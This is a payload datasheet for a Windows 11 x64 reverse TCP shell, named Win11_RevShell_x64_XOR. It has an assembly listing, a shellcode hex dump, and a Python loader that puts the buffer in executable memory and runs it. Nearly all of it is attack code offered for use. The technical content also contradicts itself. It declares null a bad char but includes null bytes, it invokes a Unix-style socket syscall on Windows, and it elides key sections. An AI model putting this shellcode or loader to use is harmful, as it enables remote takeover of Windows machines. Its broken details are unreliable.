### Payload Artifact: Win11_RevShell_x64_XOR
**Type**: Windows x64 Reverse TCP Shell
**Target**: Windows 11 (Service: Generic TCP Listener)
**Size**: 482 Bytes
**Bad Chars**: `\x00`, `\x0a`, `\x0d`

#### Assembly (Intel Syntax)
```assembly
section .text
global _start

_start:
    ; [Polymorphic NOP Sled]
    nop
    xchg rax, rax
    nop

    ; [Socket Creation]
    ; Load WS2_32.dll
    xor rcx, rcx
    mov rax, 0x6c6c642e32335f32 ; "2_32.dll"
    push rax
    mov rax, 0x5357 ; "WS"
    push rax
    mov rcx, rsp
    mov r10, 0x77e61234 ; LoadLibraryA address (placeholder)
    call r10

    ; [Connect Back]
    ; Create Socket
    xor rax, rax
    add rax, 98         ; socket() syscall
    ... (socket setup code)

    ; [XOR Decoder Stub]
    ; Key: 0xAA
    lea rsi, [rel payload_start]
    mov rcx, payload_len
decode_loop:
    xor byte [rsi], 0xAA
    inc rsi
    loop decode_loop

payload_start:
    ; [Encrypted Shellcode Here]
    ; ...
```

#### Hex Dump
```hex
\x90\x48\x87\xc0\x90\x48\x31\xc9\x48\xb8\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x50\x48\xb8\x57\x53\x00\x00\x00\x00\x00\x00\x50\x48\x89\xe1\x49\xba\x34\x12\xe6\x77\x00\x00\x00\x00\x41\xff\xd2...
```

#### Loader (Python/C wrapper)
```python
# Python loader for testing
import ctypes, struct

# Shellcode buffer (Win11_RevShell_x64_XOR)
buf =  b""
buf += b"\x90\x48\x87\xc0\x90\x48\x31\xc9"
buf += b"\x48\xb8\x32\x5f\x33\x32\x2e\x64"
# ... (truncated for brevity)

# Allocate executable memory
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(buf))

# Create thread
ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
```
